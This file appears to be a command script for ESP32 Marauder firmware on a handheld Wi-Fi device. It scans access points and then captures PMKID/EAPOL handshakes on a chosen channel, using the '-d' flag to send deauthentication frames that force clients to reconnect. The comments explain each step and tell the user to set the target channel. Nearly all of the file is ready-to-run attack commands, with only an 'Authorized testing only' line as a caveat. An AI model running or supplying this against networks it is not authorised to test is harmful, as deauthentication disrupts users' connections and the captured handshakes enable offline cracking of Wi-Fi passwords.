# handshake_capture_channel -- PMKID/EAPOL capture locked to one channel
# Target: AWOK Dual Touch V3, orange (CLI) port, esp32_marauder_dev_board_pro.bin, v1.13.0
# Use when you already know the target's channel (from `list -a`).
#   -c <ch> = sniff only that channel
#   -d      = send deauth to provoke handshakes
# EDIT: set the channel after -c to your target's channel (example uses 6).
# Duration: ~75 s.  SD: required to save the .pcap.  GPS: not required.
# Authorized testing only.

stopscan
clearlist -a
scanap
DELAY 20000
stopscan
list -a
sniffpmkid -c 6 -d
DELAY 60000
stopscan
